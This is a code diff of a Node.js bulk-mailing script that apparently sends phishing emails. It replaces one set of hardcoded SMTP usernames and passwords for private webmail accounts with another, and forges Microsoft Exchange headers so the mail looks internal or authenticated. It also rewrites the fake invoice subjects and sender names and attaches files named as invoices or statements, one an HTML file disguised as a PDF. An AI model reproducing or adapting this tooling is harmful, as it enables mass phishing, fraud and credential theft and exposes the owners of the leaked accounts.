@@ -202,11 +202,11 @@ async function readSubject(subject, email, timezone) {
         process.exit(1);
     }
     let smtpConfig = {
-        host: 'securesmtp.t-online.de',
+        host: 'mail.gmx.net',
         port: '465',
         secure: true, // if port 587, false. if port 465 = true  
-        user: 'kl-kron@t-online.de',
-        pass: '2023MILA%XY'
+        user: 'm.lutz-art@gmx.de',
+        pass: 'Lissabon'
     };
     const transporter = await checkSMTP(smtpConfig);
     console.log(chalk`{bold [!] SMTP Checked, ready to use !}\n`);
@@ -219,8 +219,8 @@ async function readSubject(subject, email, timezone) {
         await Promise.all(emailist[i].map(async(email) => {
             if(email.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
                 const doL = await readLetter('letter.html', email, "Australia/Perth");
-                const doF = await readFrom('AP_paymentainvoice@t-online.de<>', email);
-                const doS = await readSubject('AW: AW: Rechnung82783 ', email, "Australia/Perth");
+                const doF = await readFrom('Mike Risker<m.lutz-art@gmx.de>', email);
+                const doS = await readSubject('SILENTCODERSFULLDATE', email, "Australia/Perth");
                 try {
                     let mailConfig = {
                         from: doF,
@@ -228,16 +228,20 @@ async function readSubject(subject, email, timezone) {
                         subject: doS,
                         to: email,
                         headers: {
-                            'X-MS-Exchange-Organization-MessageDirectionality': 'Originating',
-                            'X-MS-Exchange-Organization-AuthAs': 'Internal',
+                            'X-MS-Exchange-Organization-MessageDirectionality': 'Incoming',
+                            'X-MS-Exchange-Organization-AuthAs': 'Anonymous',
                             'X-MS-Exchange-Organization-AuthMechanism': '02',
-                            'X-MS-Exchange-Organization-AuthSource': 'MWHPR22MB0014.namprd22.prod.outlook.com',
-                            'X-MS-Exchange-Organization-Network-Message-Id': 'ffe8bf42-c85a-42c8-a084-08d75b722819',
+                            'X-Feedback-ID': 'd3d3ce226bfabf072',
+                            'X-Provags-ID': 'ONWg2OMzFZz2GiMTYlT3lONMjWZzzxZkZ0NzNE11YZEGYVBzJUZ0EIDkQ5QkYMjYYWY42mYOOMMDDDEMDENNjYiMDT5jjjWmEATl',
+                            'boundary': '__b6291bd164186cd8c93c6d386c610965ba4ec1eb-305df82ed8efe1aa7ea9719262f75ead7ece26c4ff4f33048b59dda1b019167b',
+                            'X-MS-Exchange-Organization-AuthSource': 'MWH0EPF000989E6.namprd02.prod.outlook.com',
+                            'X-MS-Exchange-Organization-Network-Message-Id': '7af67970-ab8e-4c7f-4caf-08dc37660985',
+                            'X-MimeOLE': 'Produced By Microsoft Exchange V6.5.88790.0',
                             'X-MA4-NODE':'false'
                     },
                     attachments: [{
-                        filename: "Rechnung3876186170_ekh.a0dfed7e6267291574655b91da7427a9-931.pdf.htm",
-                        content: await readLetterAttachments(__dirname+'/vm.html', email)
+                        filename: "Statement_a0dfed7e6267291574655b91da7427a9-931.pdf",
+                        content: await readLetterAttachments(__dirname+'/vm.pdf', email)
                     }]
                     };
                     await transporter.sendMail(mailConfig);
